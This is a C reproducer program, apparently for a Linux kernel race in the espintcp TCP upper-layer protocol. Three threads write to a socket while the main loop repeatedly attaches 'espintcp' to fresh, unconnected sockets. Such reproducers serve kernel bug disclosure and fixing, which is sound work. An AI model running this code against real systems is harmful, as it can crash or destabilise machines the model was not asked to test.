C reproducer:
==================================================================
#define _GNU_SOURCE
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define SYSCHK(x) ({ long __r = (long)(x); if (__r == -1L) { perror(#x); exit(1); } __r; })
#define TCP_ULP 31

static volatile int g_fd = -1;
static volatile int g_stop;

static void *writer_fn(void *idx)
{
	unsigned char payload = 0xf7;
	char name[16];
	int fd;

	snprintf(name, sizeof(name), "syzrepro%ld", (long)idx);
	prctl(PR_SET_NAME, name, 0, 0, 0);
	while (!g_stop) {
		fd = g_fd;
		if (fd < 0) {
			usleep(200);
			continue;
		}
		write(fd, &payload, 1);
	}
	return NULL;
}

int main(void)
{
	pthread_t th[3];
	long i;
	int it, fd;

	signal(SIGPIPE, SIG_IGN);
	prctl(PR_SET_NAME, "syzrepro0", 0, 0, 0);

	for (i = 0; i < 3; i++)
		pthread_create(&th[i], NULL, writer_fn, (void *)(i + 1));

	for (it = 0; it < 200; it++) {
		fd = SYSCHK(socket(AF_INET, SOCK_STREAM, IPPROTO_TCP));
		g_fd = fd;
		usleep(3000);
		setsockopt(fd, IPPROTO_TCP, TCP_ULP, "espintcp", sizeof("espintcp"));
		g_fd = -1;
		usleep(1000);
		close(fd);
	}

	g_stop = 1;
	for (i = 0; i < 3; i++)
		pthread_join(th[i], NULL);
	return 0;
}
